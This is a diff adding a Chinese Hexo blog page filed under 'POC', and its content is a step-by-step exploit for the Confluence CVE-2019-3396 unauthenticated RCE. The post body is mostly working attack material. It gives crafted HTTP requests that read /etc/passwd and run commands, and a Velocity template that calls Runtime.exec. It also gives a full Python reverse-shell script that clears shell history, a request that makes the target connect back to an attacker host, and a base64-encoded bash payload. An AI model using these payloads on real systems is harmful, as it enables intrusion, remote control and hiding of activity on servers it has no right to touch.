@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+<meta name="description" content="Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Confluence">
+<meta property="og:url" content="http://example.com/2021/04/14/Confluence/index.html">
+<meta property="og:site_name" content="隐秘行动">
+<meta property="og:description" content="Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/preview.jpg">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/passwd.jpg">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/conmmand-look.jpg">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/ftp.jpg">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/login.jpg">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/shell.jpg">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/payload-encode.jpg">
+<meta property="og:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/cve-2019-3396.jpg">
+<meta property="article:published_time" content="2021-04-13T20:07:04.000Z">
+<meta property="article:modified_time" content="2021-04-13T20:10:29.907Z">
+<meta property="article:author" content="nicaishui">
+<meta property="article:tag" content="Confluence">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/preview.jpg">
+
+
+<link rel="canonical" href="http://example.com/2021/04/14/Confluence/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>Confluence | 隐秘行动</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">隐秘行动</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-主页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a></li>
+        <li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-3396-RCE"><span class="nav-number">1.</span> <span class="nav-text">CVE-2019-3396-RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Confluence-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-CVE-2019-3396-%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.1.</span> <span class="nav-text">Confluence 未授权 RCE (CVE-2019-3396) 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9D%91%E7%82%B9%EF%BC%9A%E6%9C%89%E4%BA%9B%E7%89%88%E6%9C%AC%E9%9C%80%E8%A6%81%E5%8A%A0Referer%E6%89%8D%E8%83%BD%E6%88%90%E5%8A%9F"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">坑点：有些版本需要加Referer才能成功</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Read"><span class="nav-number">1.1.</span> <span class="nav-text">File Read</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#excute-ifconfig"><span class="nav-number">1.2.</span> <span class="nav-text">excute ifconfig</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-ftp"><span class="nav-number">1.3.</span> <span class="nav-text">python ftp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#r-vm"><span class="nav-number">1.4.</span> <span class="nav-text">r.vm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B9shell"><span class="nav-number">1.5.</span> <span class="nav-text">弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nc-py"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">nc.py</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#encode-payload"><span class="nav-number">1.6.</span> <span class="nav-text">encode payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-cve-2019-3396-py"><span class="nav-number">1.7.</span> <span class="nav-text">python cve-2019-3396.py</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nicaishui"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">nicaishui</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fakename" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fakename@gmail.com" title="E-Mail → mailto:fakename@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/fakename" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/fakename" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/14/Confluence/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Confluence
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-04-14 04:07:04 / 修改时间：04:10:29" itemprop="dateCreated datePublished" datetime="2021-04-14T04:07:04+08:00">2021-04-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/POC/" itemprop="url" rel="index"><span itemprop="name">POC</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class=""></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p><em>Confluence</em>是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。<a id="more"></a></p>
+<h1 id="CVE-2019-3396-RCE"><a href="#CVE-2019-3396-RCE" class="headerlink" title="CVE-2019-3396-RCE"></a>CVE-2019-3396-RCE</h1><p><em>以下内容取自jas502n</em></p>
+<p>工具：CVE-2019-3396.zip</p>
+<h3 id="Confluence-未授权-RCE-CVE-2019-3396-漏洞"><a href="#Confluence-未授权-RCE-CVE-2019-3396-漏洞" class="headerlink" title="Confluence 未授权 RCE (CVE-2019-3396) 漏洞"></a>Confluence 未授权 RCE (CVE-2019-3396) 漏洞</h3><h4 id="坑点：有些版本需要加Referer才能成功"><a href="#坑点：有些版本需要加Referer才能成功" class="headerlink" title="坑点：有些版本需要加Referer才能成功"></a>坑点：有些版本需要加Referer才能成功</h4><p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/preview.jpg"></p>
+<h2 id="File-Read"><a href="#File-Read" class="headerlink" title="File Read"></a>File Read</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;rest&#x2F;tinymce&#x2F;1&#x2F;macro&#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.20.181</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.20.181&#x2F;</span><br><span class="line">Content-Length: 167</span><br><span class="line">X-Forwarded-For: 127.0.0.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https:&#x2F;&#x2F;www.viddler.com&#x2F;v&#x2F;test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/passwd.jpg"></p>
+<h2 id="excute-ifconfig"><a href="#excute-ifconfig" class="headerlink" title="excute ifconfig"></a>excute ifconfig</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;rest&#x2F;tinymce&#x2F;1&#x2F;macro&#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.20.181</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.20.181&#x2F;</span><br><span class="line">Content-Length: 198</span><br><span class="line">X-Forwarded-For: 127.0.0.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https:&#x2F;&#x2F;www.viddler.com&#x2F;v&#x2F;test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;ftp:&#x2F;&#x2F;10.10.20.166:8886&#x2F;r.vm&quot;,&quot;command&quot;:&quot;ifconfig&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/conmmand-look.jpg"></p>
+<h2 id="python-ftp"><a href="#python-ftp" class="headerlink" title="python ftp"></a>python ftp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -p  8888</span><br></pre></td></tr></table></figure>
+<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/ftp.jpg"><br><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/login.jpg"></p>
+<h2 id="r-vm"><a href="#r-vm" class="headerlink" title="r.vm"></a>r.vm</h2><p>from  <a target="_blank" rel="noopener" href="https://github.com/pyn3rd/CVE-2019-3396">https://github.com/pyn3rd/CVE-2019-3396</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set ($exp&#x3D;&quot;exp&quot;)</span><br><span class="line">#set ($a&#x3D;$exp.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($command))</span><br><span class="line">#set ($input&#x3D;$exp.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc &#x3D; $exp.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor &#x3D; $sc.getDeclaredConstructor($exp.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan&#x3D;$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+<h2 id="弹shell"><a href="#弹shell" class="headerlink" title="弹shell"></a>弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;rest&#x2F;tinymce&#x2F;1&#x2F;macro&#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.20.181</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.20.181&#x2F;</span><br><span class="line">Content-Length: 232</span><br><span class="line">X-Forwarded-For: 127.0.0.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https:&#x2F;&#x2F;www.viddler.com&#x2F;v&#x2F;test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;ftp:&#x2F;&#x2F;10.10.20.166:8888&#x2F;r.vm&quot;,&quot;command&quot;:&quot;setsid python &#x2F;tmp&#x2F;nc.py 10.10.20.166 8989&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="nc-py"><a href="#nc-py" class="headerlink" title="nc.py"></a>nc.py</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">back connect py version,only linux have pty module</span><br><span class="line">code by google security team</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import sys,os,socket,pty</span><br><span class="line">shell &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">def usage(name):</span><br><span class="line">    print &#39;python reverse connector&#39;</span><br><span class="line">    print &#39;usage: %s &lt;ip_addr&gt; &lt;port&gt;&#39; % name</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) !&#x3D;3:</span><br><span class="line">        usage(sys.argv[0])</span><br><span class="line">        sys.exit()</span><br><span class="line">    s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        s.connect((sys.argv[1],int(sys.argv[2])))</span><br><span class="line">        print &#39;connect ok&#39;</span><br><span class="line">    except:</span><br><span class="line">        print &#39;connect faild&#39;</span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    global shell</span><br><span class="line">    os.unsetenv(&quot;HISTFILE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTFILESIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTORY&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSAVE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTZONE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTLOG&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTCMD&quot;)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;,&#39;&#x2F;dev&#x2F;null&#39;)</span><br><span class="line">    os.putenv(&quot;HISTSIZE&quot;,&#39;0&#39;)</span><br><span class="line">    os.putenv(&quot;HISTFILESIZE&quot;,&#39;0&#39;)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/shell.jpg"></p>
+<h2 id="encode-payload"><a href="#encode-payload" class="headerlink" title="encode payload"></a>encode payload</h2><p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; bash -c &#123;echo,d2hvYW1p&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/payload-encode.jpg"></p>
+<h2 id="python-cve-2019-3396-py"><a href="#python-cve-2019-3396-py" class="headerlink" title="python cve-2019-3396.py"></a>python cve-2019-3396.py</h2><p><code>python test.py http://10.10.20.181 &quot;cat /etc/passwd&quot;</code></p>
+<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/cve-2019-3396.jpg"></p>
+<p>去掉div每行头尾空白</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Confluence/" rel="tag"># Confluence</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/14/Consul/" rel="prev" title="Consul">
+                  <i class="fa fa-chevron-left"></i> Consul
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/04/15/Cisco/" rel="next" title="Cisco">
+                  Cisco <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nicaishui</span>
+</div>
+<div class="wordcount">
